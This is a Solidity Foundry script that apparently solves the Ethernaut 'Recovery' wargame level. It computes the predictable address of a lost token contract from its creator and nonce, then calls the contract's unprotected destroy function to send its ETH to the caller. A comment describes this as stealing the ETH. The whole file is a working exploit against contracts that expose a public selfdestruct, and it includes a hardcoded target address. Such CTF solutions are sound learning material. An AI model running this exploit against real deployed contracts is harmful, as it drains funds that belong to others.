// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "forge-std/Script.sol";
import "forge-std/console.sol";

//The “lost” token contract address is predictable, and it has a public selfdestruct, so you can steal its ETH.

/* ============ Interface ============ */

interface SimpleToken {
    function destroy(address payable _to) external;
}

/* ============ Script ============ */

contract RecoverySolution is Script {

    function run() external {

        uint256 pk = vm.envUint("PRIVATE_KEY");

        // Replace with Recovery contract address
        address recovery = 0x71bB8A21fceaB5Fac4bB1c7075b4e82930095bF3;

        vm.startBroadcast(pk);

        /*
         * Step 1: Compute token contract address
         * address = keccak256(rlp([creator, nonce]))
         * nonce = 1 (first contract created)
         */
        address token = computeAddress(recovery, 1);

        console.log("Token Address:", token);

        /*
         * Step 2: Destroy contract and recover ETH
         */
        SimpleToken(token).destroy(payable(msg.sender));

        vm.stopBroadcast();
    }

    /* ============ Address Calculation ============ */

    function computeAddress(address creator, uint256 nonce)
        internal
        pure
        returns (address)
    {
        return address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6), // RLP prefix
                            bytes1(0x94), // address prefix
                            creator,
                            bytes1(uint8(nonce))
                        )
                    )
                )
            )
        );
    }
}